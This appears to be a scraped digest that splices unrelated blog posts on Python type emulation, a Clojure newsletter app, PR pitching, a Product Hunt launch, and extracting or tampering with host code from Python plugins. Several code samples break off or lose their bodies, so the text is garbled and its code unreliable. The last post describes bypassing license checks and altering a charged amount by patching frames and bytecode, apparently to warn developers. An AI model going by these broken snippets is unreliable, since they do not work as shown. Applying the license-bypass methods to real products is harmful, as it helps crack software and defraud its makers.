<p>And now with <a href="https://returns.readthedocs.io/en/latest/pages/hkt.html">Python</a> too!</p>

<p>There’s also <a href="https://www.cl.cam.ac.uk/~jdy22/papers/lightweight-higher-kinded-polymorphism.pdf">an original whitepaper</a> for ones who are interested.</p>

<p>The core idea of HKT emulation is that we can write types the other way around: not like <code>T[int]</code>, but rather like <code>Kind[T, int]</code> (which is absolutely the same thing).</p>

<p>This way we can transform the inner structure of generics, but maintain the simple context without reinventing <code>TypeVar</code> with type arguments. And our function’s type signature will look like: <code>Kind[T, int] -&gt; Kind[T, str]</code>.</p>

<p>Let’s see the implementation.</p>


    
      <h2 id="implementation">
        
        <a href="#implementation">Implementation</a>
        
      </h2>

<p><strong>TLDR</strong>: here’s <a href="https://gist.github.com/sobolevn/7f8ffd885aec70e55dd47928a1fb3e61">the final working code</a> with all the logic, all the hacks, and everything. In this article, we going to write and explain it step by step.</p>

<p>We would need a better example to test our implementation. Let’s build two types: a <code>Box</code> and a <code>Bag</code>. <code>Box</code> is defined by its size, while a <code>Bag</code> is an item of fashion: it has a brand name and a model name (I have a wife, I know this stuff!).</p>

<div><div><pre><code><span>from</span> <span>dataclasses</span> <span>import</span> <span>dataclass</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Callable</span><span>,</span> <span>Generic</span><span>,</span> <span>TypeVar</span>

<span>_ValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_ValueType'</span><span>)</span>
<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Box</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>length</span><span>:</span> <span>int</span>
    <span>width</span><span>:</span> <span>int</span>
    <span>height</span><span>:</span> <span>int</span>

<span>@</span><span>dataclass</span>
<span>class</span> <span>Bag</span><span>(</span><span>Generic</span><span>[</span><span>_ValueType</span><span>]):</span>
    <span>value</span><span>:</span> <span>_ValueType</span>
    <span>brand</span><span>:</span> <span>str</span>
    <span>model</span><span>:</span> <span>str</span>
</code></pre></div></div>

<p>And we can create <code>Box</code>es and <code>Bag</code>s of different types, because we can put different things inside them:</p>

<div><div><pre><code><span>box</span> <span>=</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>10</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>  <span># Box[int]
</span><span>bag</span> <span>=</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>5</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>  <span># Bag[int]
</span></code></pre></div></div>

<p>Now, we need a function with a type transformation. Let’s say we want to apply a function to the value inside boxes and bags. Let’s use fake <code>BoxOrBag</code> type for now to illustrate our intent:</p>

<div><div><pre><code><span>from</span> <span>typing</span> <span>import</span> <span>Callable</span>

<span>_NewValueType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_NewValueType'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>BoxOrBag</span><span>[</span><span>_ValueType</span><span>],</span>  <span># fake type for now
</span>    <span>callback</span><span>:</span> <span>Callable</span><span>[[</span><span>_ValueType</span><span>],</span> <span>_NewValueType</span><span>],</span>
<span>)</span> <span>-&gt;</span> <span>BoxOrBag</span><span>[</span><span>_NewValueType</span><span>]:</span>  <span># fake type for now
</span>    <span>...</span>
</code></pre></div></div>

<p>It is going to work like so:</p>

<div><div><pre><code><span>assert</span> <span>apply_function</span><span>(</span><span>box</span><span>,</span> <span>str</span><span>)</span> <span>==</span> <span>Box</span><span>(</span><span>value</span><span>=</span><span>'10'</span><span>,</span> <span>length</span><span>=</span><span>1</span><span>,</span> <span>width</span><span>=</span><span>2</span><span>,</span> <span>height</span><span>=</span><span>3</span><span>)</span>
<span>assert</span> <span>apply_function</span><span>(</span><span>bag</span><span>,</span> <span>bool</span><span>)</span> <span>==</span> <span>Bag</span><span>(</span><span>value</span><span>=</span><span>True</span><span>,</span> <span>brand</span><span>=</span><span>'Fancy'</span><span>,</span> <span>model</span><span>=</span><span>'Baggy'</span><span>)</span>
</code></pre></div></div>

<p>We only need to change current fake <code>BoxOrBag</code> type to a real HKT. We would need to define a new <code>Kind</code> type to make the emulation:</p>

<div><div><pre><code><span>_InstanceType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>
<span>_FirstTypeArgType</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_FirstTypeArgType'</span><span>,</span> <span>covariant</span><span>=</span><span>True</span><span>)</span>

<span>class</span> <span>Kind</span><span>(</span><span>Generic</span><span>[</span><span>_InstanceType</span><span>,</span> <span>_FirstTypeArgType</span><span>]):</span>
    <span>"""Used for HKT emulation."""</span>
</code></pre></div></div>

<p>One pro-tip about <code>Kind</code>: it won’t not exist during runtime. Only during type-checking.</p>

<p>Now, let’s change <code>apply_function</code> to use <code>Kind</code>:</p>

<div><div><pre><code><span>_InstanceKind</span> <span>=</span> <span>TypeVar</span><span>(</span><span>'_InstanceKind'</span><span>)</span>

<span>def</span> <span>apply_function</span><span>(</span>
    <span>instance</span><span>:</span> <span>Kind</span><span>[</span><span>_InstanceKind</span><span>,</span> <span>_ValueType</span><span>],</span>
    <span>callback</span><span>:</span> <span>Calla…</span></code></pre></div></div></div></div>

October 27, 2020 | https://findka.com/blog/essays-implementation/ | <a href="https://web.archive.org/web/*/https://findka.com/blog/essays-implementation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I recently finished the MVP for an idea I had last month: <a href="https://essays.findka.com/" target="_blank">Findka Essays</a>, a newsletter that adapts to your preferences with machine learning. I pivoted to this from a much more complicated recommender system app, so I was already familiar with (almost) all the parts needed to build it. I'm extremely happy with the result: the new app is simple, the codebase is clean, and I launched it in under two weeks. In the grand tradition of our people, it is now time for an architecture + toolkit walkthrough. Feel free to skip to whichever sections interest you most. If you read only one section, I suggest <a href="https://findka.com/blog/essays-implementation/#recommendations">Recommendations</a>.</p><p>Note: I've abstracted a lot of the code into <a href="https://findka.com/biff">Biff</a>, a web framework I released several months ago. I'll reference Biff frequently.</p><ul>
<li><a href="https://findka.com/blog/essays-implementation/#language">Language</a></li>
<li><a href="https://findka.com/blog/essays-implementation/#front-end">Front end</a></li>
<li><a href="https://findka.com/blog/essays-implementation/#authentication">Authentication</a></li>

<li><a href="https://findka.com/blog/essays-implementation/#analytics">Analytics</a></li>
</ul><hr><h3 id="language">Language</h3><p>The vast majority of the app is written in Clojure (the only exception is the actual recommendation algorithm, which is written in Python). Clojure is a fabulous language that has a strong emphasis on simplicity and stability, which makes codebases easy to maintain and extend in the long run. As a Lisp, it also has an extremely tight feedback loop which is great for rapid development.</p><p>There is a trade-off: since Clojure focuses on long-term concerns over short-term concerns, it can take a while to get up to speed (though it's a lot easier if you have a mentor). For example, to do web dev in Clojure, you'll need to learn how to piece together a bunch of individual libraries—there isn't a go-to framework like Rails or Django. (<a href="https://luminusweb.com/" target="_blank">Luminus</a> is probably the best starting point, after you're familiar with the language itself).</p><p>In most cases, I'd say the trade-off is well worth it. But for small or experimental apps (like you might build in a startup), speed at the beginning is extra valuable. If you want to move fast right away but you're not already comfortable in the Clojure ecosystem, you might have a bad time. One of my goals for Biff is to help mitigate that.</p><h3 id="front-end">Front end</h3><p>OK, now for some actual code. Findka Essays, unlike its predecessor, is a humble multi-page application. No React here. So the front end is pretty simple.</p><p>(For brevity, I'll call it "Findka" from here on out).</p><p>I use <a href="https://github.com/tonsky/rum" target="_blank">Rum</a> for HTML generation. Here's a quick example:</p><pre><code>(ns hello.world
 (:require
   [rum.core :as rum]))

(defn -main []
  (spit "hello.html"
    (rum/render-static-markup
      [:html
       [:body
        [:p {:style {:color "red"}}
         "Hello world!"]]])))
</code></pre><p>After <a href="https://clojure.org/guides/getting_started" target="_blank">installing Clojure</a>, you could put that in <code>src/hello/world.clj</code> and then run the program with <code>clj -Sdeps '{:deps {rum/rum {:mvn/version "0.11.5"}}}' -M -m hello.world</code>. That's a great way to get started with Clojure, actually—you can make a whole static site with just functions, data structures, and Rum. That's how I made Findka's landing page. Here's a snippet:</p><pre><code>(defn home []
  (base-page {:scripts [[:script {:src "/js/ensure-logged-out.js"}]]}
    [:.bg-dark.text-white
     [:.container.px-3.mx-auto.max-w-screen-md
      [:.nunito-sans-bold.text-2xl.mt-4.mb-8.sm:text-center
       "Great essays delivered to your inbox. " [:br.hidden.md:inline]
       "Chosen specifically for you with machine learning."]
      [:a.btn.btn-green.btn-block.sm:max-w-sm.mx-auto
       {:href "/signup"}
       "Sign up"]
      ...
</code></pre><p>This project is the first time I've used <a href="https://tailwindcss.com/" target="_blank">Tailwind CSS</a> (I used Bootstrap previously). I give it two thumbs up. Tailwind gives you smaller, better building blocks than Bootstrap, and it has responsive variants for every class (hallelujah). Setup was straightforward. After an <code>npm init; npm install tailwindcss --save-dev</code>, you just need a few files:</p><p><code>tailwind.config.js</code>:</p><pre><code>module.exports = {
  purge: [
    './src/**/*.clj', // for tree-shaking
  ],
  theme: {
    extend: {
      colors: {
        'dark': '#343a40',
        'hn-orange': '#ff6600',
        ...
      }
    }
  }
}
</code></pre><p><code>tailwind.css</code>:</p><pre><code>@tailwind base;

@tailwind components;
@responsive {
  .btn-thin {
    @apply text-center py-2 px-4 rounded;
  }
  .btn {
    @apply btn-thin font-bold;
  }
  ...
}

@tailwind utilities;
@responsive {
  .nunito-sans-bold {
    font-family: 'Nunito Sans', sans-serif;
    font-weight : 900;
  }
  ...
}
</code></pre><p>Build with <code>npx tailwindcss build tailwind.css -o output.css</code>.</p><p>The last piece is fonts. I am not a designer, at all. Despite this, I have recently made a startling discovery: using different fonts, instead of just the default, can actually make your site look a lot better. It turns out you can just doom scroll through <a href="https://fonts.google.com/" target="_blank">Google Fonts</a> until you find some you like. I did that for Findka's logo (I tried AI logo generators in the past, but they weren't good).</p><h3 id="authentication">Authentication</h3><p>Findka supports signin via email link or Google. Biff mostly handles email link auth for you.
Just make a form with an <code>email</code> field that POSTs to <code>/api/signup</code>. Biff sends the user an email with a link, they click on it, boom. You have to provide an email template and a function that actually sends the email. I use Mailgun, so Findka's email function looks like this:</p><pre><code>(def templates
  {:biff.auth/signup
   (fn [{:keys [biff.auth/link]}]
     {:from "Findka Essays &lt;...&gt;"
      :subject "Create your Findka Essays account"
      :html (rum/render-static-markup
              [:div
               [:p "We received a request to create a Findka Essays account using this email address."]
               [:p [:a {:href link :target "_blank"} "Click here to create your account."]]
               [:p "If you did not request this link, you can ignore this email."]])})
   ...})

(defn send** [api-key opts]
  (http/post (str "https://api.mailgun.net/v3/mail.findka.com/messages")
    {:basic-auth ["api" api-key]
     :form-params opts}))

(defn send* [{:keys [mailgun/api-key template data] :as opts}]
  (if (some? template)
    (let [template-fn (get templates template)
          mailgun-opts (template-fn data)]
      (send** api-key mailgun-opts))
    (send** api-key (select-keys opts [:to :subject :text :html]))))

(defn send [{:keys [params template recaptcha/secret-key] :as sys}]
  (if (= template :biff.auth/signup)
    (let [{:keys [success score]}
          (:body
            (http/post "https://www.google.com/recaptcha/api/siteverify"
              {:form-params {:secret secret-key
                             :response (:g-recaptcha-response params)}
               :as :json}))]
      (when (and success (&lt;= 0.5 score))
        (send* sys)))
    (send* sys)))
</code></pre><p>As shown at the end, I use Recaptcha for bot control. It's nice because you
don't have to make the user do anything; Google's script will simply give you a
score that represents how likely the user is to be a human.</p><p>Biff doesn't have Google sign-in support built in (yet), but it's pretty simple to add.
After the front-end bit is taken care of, you just have to add an HTTP endpoint that receives
a token, verifies it using Google's library, and sets a session cookie.</p><p>That's sort of a funny way to use Google sign-in, I'll admit. You're "supposed" to send the token
with every request and verify it each time, letting Google's code handle sessions on the client.
However, Biff is already set up for authenticating requests via session cookie, and that's more convenient for multi-page applications anyway.</p><h3 id="crud">CRUD</h3><p>I use <a href="https://opencrux.com/" target="_blank">Crux</a> for the database. Crux is an immutable document database with datalog queries. Another way to explain it is that Crux works well as a general-purpose database (e.g. a replacement for postgres), but it fits better with functional programming. You also get flexible data modeling without giving up query power.</p><p>(That ignores Crux's raison d'être, bitemporal queries—a cool feature, and no doubt extremely useful if you need those. For my simple applications, I haven't.)</p><p>Crux doesn't enforce any schema, but Biff does. You can specify schema using <a href="https://clojure.org/about/spec" target="_blank">Clojure spec</a>:</p><pre><code>(require '[trident.util :as u])

(u/sdefs
  ::event-type #{:submit :email :click :like :dislike}
  ::timestamp  inst?
  ::url        string?
  ::parent     uuid?
  ::user       uuid?
  ::event      (u/only-keys
                 :req-un [::event-type
                          ::timestamp
                          ::user
                          ::url]
                 :opt-un [::parent]))

(def schema
  {:events {:spec [uuid? ::event]}})
</code></pre><p>This schema defines a "table" for events. The <code>[uuid? ::event]</code> part means that
the primary key for an event document should be a UUID, and the rest of the
document should conform to the spec given for <code>::event</code> above. In this case,
that means the document must have an event type, timestamp, user ID and URL,
and it can optionally have a "parent" key (which is set to the primary key of
another event).</p><p>Like a standard multi-page app, Findka has POST endpoints for writing to
the database and GET endpoints for reading (though I have no idea if the
endpoints adhere to REST or not). Here's one for submitting an essay:</p><pre><code>(defn submit-essay [{:keys [biff/node session/uid params] :as sys}]
  (if (nil? uid)
    {:status 302
     :headers/Location "/login/"}
    (do
      (crux/await-tx node
        (biff.crux/submit-tx sys
          {[:events] {:user uid
                      :timestamp :db/current-time
                      :event-type :submit
                      :url (:url params)}}))
      {:status 302
       :headers/Location "/settings"})))

(def routes
  [["/api/submit-essay"
   {:post submit-essay
    :name ::submit-essay
    :middleware [anti-forgery/wrap-anti-forgery]}]
   ...])
</code></pre><p>And here's a snippet from the <code>/settings</code> page. The call to <code>crux/q</code> performs
a datalog query which returns the current user's 10 most recent events, which
are displayed in the UI:</p><pre><code>(defn settings* [{:keys [biff/db session/uid]}]
  (let [events (map first
                 (crux/q db
                   {:find '[event timestamp]
                    :full-results? true
                    :args [{'user uid}]
                    :order-by '[[timestamp :desc]]
                    :limit 10
                    :where '[[event :event-type]
                             …</code></pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>PR, or Public Relations, is just the process of getting people to write article about you. The type of press you can get does vary beyond that though.</p><p>It could be podcast interviews, it could be getting featured in a magazine or the newspaper, it could be getting on television for a local news channel.</p><p>But the process is relatively the same to get new press. You have a good story, and you pitch it to news sources. Before you pitch it to larger news sources like TechCrunch or WIRED you need to make a proof of concept. Most of the successful press pitches I've seen have used an existing piece of content almost as if to prove the story is interesting.</p><p>So you get that flagship smaller article, or a decent podcast interview, and then you email it to reporters at bigger publications to see if they'll pick it up.</p><p>But before you do that, you've got to get that flagship content. In my case, I do a lot of stuff on social media, and I connect with a lot of podcast hosts since I have my own show. Then, I emailed a local news outlet in the business space with the podcast link and a simple description. It helps that I've spoken with the reporter I pitched, as well. I had recommended her a few different people already for other articles she was writing, and so she knew me before I sent that request.</p><p>So, recommend other awesome companies or entrepreneurs you know, and then a little while later, pitch yourself with a podcast episode or personal article. Hopefully you'll get that first bit of press, and you can use it to scale.</p><p>Now let's say you have your first piece of content, article or otherwise, and you want to pitch it to larger publications - you'll need to target specific writers. Scroll through the articles each news outlet has published in the past, find a series they do, or a common thread, and for each article that seems to relate to your story, keep track of the author. If you find a common author among a few articles similar to the story you want to pitch, they're your point person.</p><p>Now, you'll likely want to pitch them over email, and if it's not immediately listed on the website, you can use <a href="https://hunter.io/">Hunter.io</a> to find it 95% of the time. I <a href="https://youtu.be/8UP8DiCMCDU">filmed a little guide</a> a long time ago on how I personally do it. </p><p>Great, now you have content about your story and a list of people that might be interested. That's all you need, just send a few incredibly short emails and hope. A lot of the successful press pitches I've seen look something like this:</p><p>"Hello [name],</p><p>There's a new startup helping dog owners get connected to local dog walkers and it seems to be solving a really big problem. I noticed you report on this kind of tech so I figured I would reach out.</p><p>Here's a link to an article recently written on it: [link]</p><p>I run the startup, and I would be happy to talk about what we're trying to solve if an interview is something you would be interested in!"</p><p>That's it - as simple as possible. Reporters are getting pitched all day. Make sure the topic is right in their wheelhouse, and make sure you keep the email short as hell so they can read it super quick. I'm not entirely sure what timing would be appropriate, but if I want someone to respond to an email I send it Tuesday morning, so it's at the top of their inbox when they get to work and they already cleared the weekend backlog on Monday.</p></div></div>]]>

  <p>Yesterday I <a href="https://www.producthunt.com/posts/mugshot-bot">launched Mugshot Bot on Product Hunt</a> as a solo founder. It was a wild ride and I’ve never been glued to my computer like this.</p>

<p>The launch finished with with over 250 upvotes, 39 comments, and #5 Product of the Day. It generated close to 1000 visits, over 70 sign ups, and 6 paying customers.</p>

<p>I even got a cute little badge from Product Hunt!</p>

<p>Here’s my journey on what worked, what didn’t work, and things I wish I spent more time on. I’m not guaranteeing following these will make your launch a success. But hopefully you can pick up a tip or two.</p>

<p>Oh, and for newcomers, <a href="https://www.mugshotbot.com/">Mugshot Bot</a> is a tool that automates link preview images for your website without design tools.</p>

<h2 id="what-worked">What worked</h2>

<p>The single biggest contributor to the success of this Product Hunt launch was the work done, well, before the launch.</p>

<h3 id="build-in-public">Build in public</h3>

<p>First, I’ve been building Mugshot Bot in public, sharing progress as it happens. Almost every day for the past two months I’ve tweeted about a new feature, an idea, design progress, or a question.</p>

<p>Anything worth elaborating on (but not quite long enough for a blog post) I’ve been posting to <a href="https://www.indiehackers.com/joemasilotti">Indie Hackers</a>.</p>

<p>I’ve also been very active in the <a href="https://www.weekendclub.co/">Weekend Club</a> community on Slack. Shout out to <a href="https://twitter.com/charlierward">Charlie</a> for running an amazing community.</p>

<blockquote>
  <p>Weekend Club is a weekend co-working community and a very supportive Slack group. Mention <code>WEEKENDJOE</code> when you sign up for a free month.</p>
</blockquote>

<p>All of my metrics are <a href="https://www.mugshotbot.com/stats/">publicly available</a>, too: total visitors, registered accounts, MRR, etc.</p>

<h3 id="get-early-upvotes">Get early upvotes</h3>

<p>You only get one day on Product Hunt, and those <a href="https://blog.producthunt.com/how-to-launch-on-product-hunt-7c1843e06399">24 hours are based on the Pacific time zone</a>. Ideally, you are launching early in the morning so you can maximize your time for upvotes.</p>

<p>I’m in Eastern time and didn’t want to get up at 3am to start promoting my post. Instead, I had someone in London help me out.</p>

<p>Shout out to <a href="https://twitter.com/jmckinven">James</a> for getting the ball rolling. He shared the post with other indie hackers and makers in his circle which bumped the post right from the get-go.</p>

<h3 id="live-tweet">Live tweet</h3>

<p>About five seconds after I woke up I <a href="https://twitter.com/joemasilotti/status/1320674419077910530">tweeted a link</a> to the Product Hunt post. I followed up on every milestone, every mishap, and every little victory.</p>

<p><a href="https://twitter.com/joemasilotti/status/1320674419077910530">
  <img src="https://masilotti.com/images/mugshotbot-tweet-thread.png" alt="Beginning of Twitter thread about Product Hunt launch">
  </a>
</p>

<p>I also pinned the tweet to my profile and set my URL to the Product Hunt page for the day.</p>

<p>In total, the tweet received 7500 impressions and a whopping 500 engagements. I replied to <a href="https://twitter.com/joemasilotti/status/1320674419077910530">the thread</a> 20 times.</p>

<p>This was where people showed their excitement. If you click through the thread there’s a ton of people interacting with me, letting me know they upvoted, and just being generally awesome.</p>

<p>It was a highlight of the day for me to connect directly with people about Mugshot Bot on Twitter.</p>

<p>Shout out to <a href="https://twitter.com/panphora">David</a> for this idea and for providing a <em>ton</em> of feedback while building Mugshot Bot.</p>

<h3 id="be-genuine">Be genuine</h3>

<p>Product Hunt has a strict policy against asking for upvotes. Instead, they recommend asking folks to “check out the page.”</p>

<p>What worked well for me was being genuine. I wanted support from my audience so that’s what I asked for. “I would love if you could show me some support” seemed to resonate.</p>

<p>I also called out in my <a href="https://twitter.com/joemasilotti/status/1320674419077910530">initial tweet</a> that I was nervous. This was met with a lot of positive reinforcement from folks that went a long way towards ending the day feeling great.</p>

<h2 id="what-didnt-work">What didn’t work</h2>

<p>Not every second of my launch day was productive. Here are some things that I tried but didn’t seem to help very much.</p>

<h3 id="engaging-out-of-target-audiences">Engaging out-of-target audiences</h3>

<p>A big portion of my Twitter followers are indie makers, developers, and/or bloggers. Mugshot Bot helps content creators and hackers the most, so there’s a ton of overlap.</p>

<p>That isn’t the case for my Facebook audience. Most of these folks are friends from high school and college. I’ll also be the first to admit I don’t post on Facebook much anymore.</p>

<p>The takeaway is to pick the audience that matters and focus on that instead of spreading yourself too thin.</p>

<h3 id="email-campaign-asking-for-support">Email campaign asking for support</h3>

<p>This one surprised me the most. Before the launch I had about 100 registered accounts. I sent an email letting them know about the importance of the Product Hunt launch and asking for support.</p>

<p>Oddly enough, only 9 people clicked through the Product Hunt post. Here’s the email, if you’re interested.</p>

<p><img src="https://masilotti.com/images/product-hunt-launch-email.jpeg" alt="Screenshot of email campaign announcing Product Hunt launch"></p>

<p>Looking back, I can’t tell if these folks didn’t care enough or my messaging was off. Probably a combination of the two!</p>

<h3 id="twitter-ads">Twitter ads</h3>

<p>As soon as I got my first new customer I set up a Twitter campaign for the same amount. I focused on getting clicks to the Product Hunt post and promoted the first post in the Twitter thread.</p>

<p>I cancelled the campaign after two hours.</p>

<p>In 2 hours I received 2 clicks. For $15. This might make sense for a direct acquisition channel, but $7.50 per click was nowhere near worth it for potential upvotes.</p>

<h3 id="obsessively-refresh-metrics">Obsessively refresh metrics</h3>

<p>In the spirit of building in public all of <a href="https://www.mugshotbot.com/stats/">Mugshot Bot’s metrics are publicly available</a>.</p>

<p><a href="https://www.mugshotbot.com/stats">
  <img src="https://masilotti.com/images/mugshotbot-stats.png" alt="Mugshot Bot public metrics">
  </a>
</p>

<p>I probably refreshed this page over 100 times throughout the day. Sure, there were a few dopamine hits when a number spiked. But overall, it was a waste of time.</p>

<p>Metrics are important but being glued to them is a dangerous habit.</p>

<h2 id="what-i-wish-id-also-done">What I wish I’d also done</h2>

<p>There’s only so many hours the day. But here are a few things that I wish I carved out some extra time for.</p>

<h3 id="post-to-indie-hackers">Post to Indie Hackers</h3>

<p>Early last week I posted to Indie Hackers documenting <a href="https://www.indiehackers.com/post/my-prep-for-a-product-hunt-launch-on-monday-66f2757c1f">everything I did for seven days leading up to the launch</a>. It was really fun to update this throughout the week.</p>

<p>But for some reason I completely forgot to post on launch day! I think this could have strummed up a bit more excitement but nothing getting too upset over.</p>

<p>You could post in the <a href="https://www.indiehackers.com/group/product-launch">Product Launch</a>  or <a href="https://www.indiehackers.com/group/product-hunt">Product Hunt</a> groups, they both have about 150 members.</p>

<h3 id="fine-tune-a-welcome-e-mail">Fine-tune a welcome e-mail</h3>

<p>Late in the day I added a click-to-tweet link to the welcome email to people who have signed up for Mugshot Bot. A few people used it, too!</p>

<p>The link uses Twitter intents to automatically prompt a drafted tweet with populated content. I used <a href="https://tech.cymi.org/tweet-intents">Twitter Intent Creator</a> to generate the link.</p>

<p>In hindsight, I wish I added this earlier in the day to capitalize on some more reach.</p>

<h2 id="your-product-hunt-launch">Your Product Hunt launch</h2>

<p>That’s everything that I learned during my first big Product Hunt launch. I hope you picked up a tip or two for your launch!</p>

<p>My tl;dr is to build an audience before your launch. Without this you’ll be fighting an uphill battle.</p>

<p>If you used this post to help your launch I’d love to hear about it. <a href="https://twitter.com/joemasilotti/status/1321129876938649600">Reply to this tweet</a> or <a href="mailto:joe@masilotti.com">send me an email</a> and we can talk shop.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I started learning Python in 2009, and I had a pretty challenging task and somewhat unusual use of Python. I was working on a desktop application that used PyQT for GUI and Python as the main language.</p><p>To hide the code, I embedded Python interpreter into a standalone Windows executable. There are a lot of solutions to do so (e.g. <a href="https://www.pyinstaller.org/">pyinstaller</a>, <a href="https://www.py2exe.org/">pyexe</a>), and they all work similarly. They compile your Python scripts to <a href="https://docs.python.org/3/glossary.html#term-bytecode">bytecode</a> files and bundle them with an interpreter into an executable. Compiling scripts down to bytecode makes it harder for people with bad intentions to get the source code and crack or hack your software. Bytecode has to be extracted from the executable and decompiled. It can also produce obfuscated code that is much harder to understand.</p><p><img src="https://rushter.com/static/uploads/img/code_isolation.svg"></p><p>At one point, I wanted to add a plugin system so that users could benefit from extra features. Executing arbitrary third-party code on your server is dangerous. But can it harm your commercial product when you execute it on user's machines, and users have trust in that they are executing? At that time, the answer was not obvious, and I decided to implement the system.</p><p>A few years later, it became apparent that you should <strong>never</strong> execute third-party code using the same Python process (interpreter) if you don't want to leak the source code. There are a lot of commercial products that use Python for desktop software or as a <a href="https://wiki.python.org/moin/AppsWithPythonScripting">scripting language</a>. Some of them can be at risk.</p><p>There are many ways to extract Python bytecode even if you don't run any third-party code. It's a never-ending arms race between developers and reverse engineers, but it's much easier to extract the bytecode and crack your program when you can run your own code. My software was later cracked without using the plugins subsystem.</p><p>So what can you do to the "host" code when it executes your scripts?</p><p>Python is a very dynamic language, and you can do a lot of things. This article demonstrates a few approaches on how to modify or extract the source code.</p><blockquote><p>When you work with a regular Python process, you don't even need a plugins system. You can always <a href="https://wiki.python.org/moin/DebuggingWithGdb">attach to a running</a> process using GDB and inject your own code.</p></blockquote><h2>Monkey patching</h2><p>If a plugin can be initialized before a function that you want to modify, we can simply mock it.</p><p>Let's suppose we have a function that validates license:</p><div><pre><span></span><code><span>def</span> <span>validate_license</span><span>():</span>
    <span>hw_hash</span><span>,</span> <span>hw_id</span> <span>=</span> <span>get_hardware_id</span><span>()</span>

    <span>return</span> <span>hw_hash</span> <span>==</span> <span>server_hash</span>
</code></pre></div><p>We can bypass the checks by replacing a few functions:</p><div><pre><span></span><code><span>def</span> <span>mock_licensing</span><span>():</span>
    <span>requests</span> <span>=</span> <span>__import__</span><span>(</span><span>'requests'</span><span>)</span>

</code></pre></div><h2>Frame objects</h2><p>In Python, frame objects keep the state of functions that are currently running. Each frame corresponds to single function execution. Python modules and class definition use frames too. That is a building block of the <a href="https://en.wikipedia.org/wiki/Call_stack">call stack</a>.</p><p>Given a frame object, you can:</p><ul><li>Change locals, globals, and builtins at runtime.</li><li>Get bytecode of a function (code block) that is being executed.</li></ul><p>Here is how you can list all frames in the current call stack:</p><div><pre><span></span><code><span>def</span> <span>list_frames</span><span>():</span>
    <span>current_frame</span> <span>=</span> <span>sys</span><span>.</span><span>_getframe</span><span>(</span><span>0</span><span>)</span>

</code></pre></div><p>The <a href="https://docs.python.org/3/library/inspect.html">inspect</a> module describes all available attributes of the frame and <a href="https://docs.python.org/3/c-api/code.html">code</a> objects.</p><h3>Changing locals</h3><p>Let's suppose we have a function that calls a <a href="https://en.wikipedia.org/wiki/Callback_(computer_programming)">callback</a>, and we have control over the callback. For example, the path to callback can be defined in the settings file.</p><div><pre><span></span><code><span>def</span> <span>get_amount</span><span>():</span>
    <span>return</span> <span>10</span>

    <span>print</span><span>(</span><span>amount</span><span>)</span>
</code></pre></div><p>The last function charges a user for a monthly subscription and allows to specify a custom logging callback. I've added a few prints so that you can copy-paste the code and see the results.</p><p>Since logging happens in the middle, we can modify the <code>amount</code> variable.</p><div><pre><span></span><code><span>def</span> <span>fix_amount</span><span>(</span><span>_</span><span>):</span>

<span>10</span>
<span>-</span><span>100</span>
</code></pre></div><h4>Fast locals</h4><p>In Python, local and global variables are stored in dictionaries. Every time you use a variable, Python needs to lookup it in a dictionary. Since dictionary lookups are not free and take time, Python uses various optimization techniques.</p><p>By analyzing the code of a function, it's possible to detect variable names that a function will be using when running. Our function has three local variables: <code>amount</code>, <code>user</code>, <code>logger</code>. Function arguments are local variables too.</p><p>When compiling source code to bytecode, Python maps known variable names to indexes in a special array and stores them there. Accessing a variable by an index is fast, and most of the functions use predefined names. Optimized variables are called <code>fast locals</code>. To keep variable names that are generated on the go, Python uses a dictionary as a fallback.</p><p>When dereferencing variables, Python prioritizes fast locals and ignores changes in the dictionary. That's why we use <code>ctypes</code> and call internal <a href="https://github.com/python/cpython/blob/cb9879b948a19c9434316f8ab6aba9c4601a8173/Objects/frameobject.c#L1148"><code>PyFrame_LocalsToFast</code></a> function.</p><h2>Patching bytecode</h2><p>I have an article on <a href="https://rushter.com/blog/python-bytecode-patch/">bytecode patching</a> that describes how to patch function definition. We can go even further and patch a running function.</p><p>Instead of source code, Python interpreter executes bytecode that was generated using a special compiler. When executing the code, a special virtual machine executes each instruction one by one. That allows us to replace unexecuted instructions on the go.</p><p>Let's use this function as an example:</p><div><pre><span></span><code><span>def</span> <span>is_valid</span><span>():</span>
    <span>return</span> <span>False</span>


<span>def</span> <span>check_license</span><span>(</span><span>callback</span><span>):</span>
    <span>callback</span><span>()</span>

        <span>print</span><span>(</span><span>'exiting'</span><span>)</span>
        <span>exit</span><span>(</span><span>0</span><span>)</span>
</code></pre></div><p>The builtin <code>dis</code> module allows us to see the bytecode in a human-readable format:</p><div><pre><span></span><code><span>In</span> <span>[</span><span>12</span><span>]:</span> <span>check_license</span><span>.</span><span>__code__</span><span>.</span><span>co_code</span>

Unfortunately, we can't modify the <code>frame.f_code.co_code</code> attribute since it's a read-only attribute.</p><p>To bypass this restriction, we use <code>ctypes</code> module that allows us to modify the RAM of a Python process. Every <code>bytes</code> object contains meta-information, such as <a href="https://rushter.com/blog/python-garbage-collector/">number of references</a> and information about the type. To locate the exact address of the raw C string, we use the <code>id</code> function that returns object address in memory, and we skip all meta information (size of the empty byte string). The output from <code>dis.dis</code> shows that the <code>POP_JUMP_IF_TRUE</code> instruction is the 10th element in the byte string that we need to replace.</p><h2>Extracting the source code</h2><p>Every script that Python runs or imports creates a <code>module</code> object that stores constants, functions, class definitions, and so on.

